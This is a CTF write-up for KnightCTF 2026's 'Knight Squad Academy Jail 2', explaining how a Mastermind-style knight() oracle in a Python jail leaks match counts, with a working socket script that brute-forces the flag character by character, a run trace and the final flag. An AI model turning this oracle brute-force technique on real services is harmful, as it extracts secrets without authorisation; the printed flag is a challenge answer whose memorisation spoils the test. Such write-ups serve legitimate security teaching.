# Knight Squad Academy Jail 2 - PWN Challenge Writeup

**CTF:** KnightCTF 2026  
**Challenge:** Knight Squad Academy Jail 2  
**Category:** PWN / Jail  
**Points:** 100  

---

## Challenge Description

> In the world of Knight Squad Academy jail only a knight can help you!
>
> Flag Format: KCTF{flag_here}
>
> Connection: `nc 66.228.49.41 41567`

**Hints:**
- There is a function called `knight()`
- Simply run `knight("K")` and you will get "too short" message
- Find out the flag length

---

## Initial Reconnaissance

### Connecting to the Service

```bash
nc 66.228.49.41 41567
```

We're dropped into a Python jail with heavy restrictions. Most inputs are rejected with generic errors, indicating a strict parser with a blacklist.

### Discovering the Oracle

The hint mentions a `knight()` function. Testing reveals:

```python
>>> knight("A")
too short

>>> knight("A"*29)
too short

>>> knight("A"*30)
1 0

>>> knight("A"*31)
too long
```

**Key Finding:** The flag length is exactly **30 characters**.

---

## Understanding the Feedback System

### Mastermind-Style Response

For a length-30 guess, the response format is:

```
<first> <second>
```

Where:
- **first** = Number of correct characters in the **correct position**
- **second** = Number of correct characters in the **wrong position**

### Testing the Theory

```python
>>> knight("A"*30)
1 0   # One 'A' in correct position

>>> knight("B"*30)
0 0   # No 'B' in the flag

>>> knight("K"*30)
1 0   # One 'K' in correct position (likely position 0)
```

This confirms a Mastermind-style oracle!

---

## Exploitation Strategy

### Step 1: Find a Filler Character

We need a character that **does NOT appear in the flag** (returns `0 0`):

```python
>>> knight("X"*30)
0 0   # Perfect! 'X' is our filler
```

### Step 2: Position-by-Position Brute Force

The algorithm:

1. Start with all filler: `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`
2. For each position `i` (0 to 29):
   - Get baseline score with current guess
   - Try each candidate character at position `i`
   - If score increases by 1, that character is correct
   - Keep it and move to next position

### Python Implementation

```python
#!/usr/bin/env python3
import socket
import re
import string

HOST = '66.228.49.41'
PORT = 41567
FLAG_LEN = 30

class JailConnection:
    def __init__(self):
        self.sock = None
    
    def connect(self):
        self.sock = socket.socket()
        self.sock.settimeout(10)
        self.sock.connect((HOST, PORT))
        # Consume banner
        self.sock.recv(4096)
    
    def knight(self, guess):
        cmd = f'knight("{guess}")\n'
        self.sock.send(cmd.encode())
        
        self.sock.settimeout(2)
        r = ""
        for _ in range(3):
            try:
                chunk = self.sock.recv(4096).decode()
                r += chunk
                if '>' in chunk:
                    break
            except:
                break
        
        match = re.search(r'(\d+)\s+(\d+)', r)
        if match:
            return int(match.group(1)), int(match.group(2))
        return None, None

def solve():
    conn = JailConnection()
    conn.connect()
    
    # Find filler character
    filler = 'X'
    
    # Charset - prioritize likely flag characters
    charset = "KCTF{}_" + string.ascii_letters + string.digits + "!-"
    
    flag = [filler] * FLAG_LEN
    
    for pos in range(FLAG_LEN):
        baseline, _ = conn.knight(''.join(flag))
        
        for c in charset:
            if c == filler:
                continue
            
            test = list(flag)
            test[pos] = c
            
            score, _ = conn.knight(''.join(test))
            
            if score and score > baseline:
                flag[pos] = c
                print(f"[Pos {pos:2d}] '{c}' -> {''.join(flag)}")
                break
    
    return ''.join(flag)

if __name__ == "__main__":
    print(solve())
```

---

## Execution Trace

Running the solver shows the flag being recovered character by character:

```
[*] Brute forcing 30 positions...

[Pos  0] 'K' -> K?????????????????????????????
[Pos  1] 'C' -> KC????????????????????????????
[Pos  2] 'T' -> KCT???????????????????????????
[Pos  3] 'F' -> KCTF??????????????????????????
[Pos  4] '{' -> KCTF{?????????????????????????
[Pos  5] '_' -> KCTF{_????????????????????????
[Pos  6] 'a' -> KCTF{_a???????????????????????
[Pos  7] 'N' -> KCTF{_aN??????????????????????
[Pos  8] 'O' -> KCTF{_aNO?????????????????????
[Pos  9] 't' -> KCTF{_aNOt????????????????????
[Pos 10] 'H' -> KCTF{_aNOtH???????????????????
[Pos 11] 'E' -> KCTF{_aNOtHE??????????????????
[Pos 12] 'R' -> KCTF{_aNOtHER?????????????????
[Pos 13] '_' -> KCTF{_aNOtHER_????????????????
[Pos 14] 'J' -> KCTF{_aNOtHER_J???????????????
[Pos 15] 'A' -> KCTF{_aNOtHER_JA??????????????
[Pos 16] 'I' -> KCTF{_aNOtHER_JAI?????????????
[Pos 17] 'L' -> KCTF{_aNOtHER_JAIL????????????
[Pos 18] '_' -> KCTF{_aNOtHER_JAIL_???????????
[Pos 19] 'Y' -> KCTF{_aNOtHER_JAIL_Y??????????
[Pos 20] '0' -> KCTF{_aNOtHER_JAIL_Y0?????????
[Pos 21] 'U' -> KCTF{_aNOtHER_JAIL_Y0U????????
[Pos 22] '_' -> KCTF{_aNOtHER_JAIL_Y0U_???????
[Pos 23] 'b' -> KCTF{_aNOtHER_JAIL_Y0U_b??????
[Pos 24] 'R' -> KCTF{_aNOtHER_JAIL_Y0U_bR?????
[Pos 25] 'o' -> KCTF{_aNOtHER_JAIL_Y0U_bRo????
[Pos 26] 'K' -> KCTF{_aNOtHER_JAIL_Y0U_bRoK???
[Pos 27] 'E' -> KCTF{_aNOtHER_JAIL_Y0U_bRoKE??
[Pos 28] '_' -> KCTF{_aNOtHER_JAIL_Y0U_bRoKE_?
[Pos 29] '}' -> KCTF{_aNOtHER_JAIL_Y0U_bRoKE_}
```

---

## Technical Analysis

### Why This Works

1. **Oracle Leak**: The `knight()` function exposes exact match counts
2. **Deterministic Feedback**: Each character at each position gives consistent scores
3. **No Rate Limiting**: Server allows unlimited queries (though connections may timeout)

### Complexity

- **Charset size**: ~70 characters (a-z, A-Z, 0-9, symbols)
- **Flag length**: 30 characters
- **Worst case queries**: 30 × 70 = 2,100 queries
- **Best case** (with KCTF{ prefix optimization): ~1,500 queries

### Optimizations Applied

1. **Prefix Knowledge**: Start charset with `KCTF{}_` since flags follow this format
2. **Persistent Connection**: Reuse socket to reduce connection overhead
3. **Early Termination**: Stop testing once correct char found for each position

---

## Key Takeaways

1. **Oracle Attacks**: Even minimal information leakage can compromise secrets
2. **Mastermind Logic**: Classic game theory applies to security challenges
3. **Incremental Recovery**: Build the solution one character at a time
4. **Connection Resilience**: Handle network issues gracefully in exploit code

---

## Flag

```
KCTF{_aNOtHER_JAIL_Y0U_bRoKE_}
```

---

## References

- [Mastermind (board game)](https://en.wikipedia.org/wiki/Mastermind_(board_game))
- [Python Jail Escape Techniques](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [Side-Channel Attacks](https://en.wikipedia.org/wiki/Side-channel_attack)

---

**Author:** MR. Umair  
**Date:** January 21, 2026  
**LinkedIn:** [linkedin.com/in/umairaziz001](https://www.linkedin.com/in/umairaziz001/)
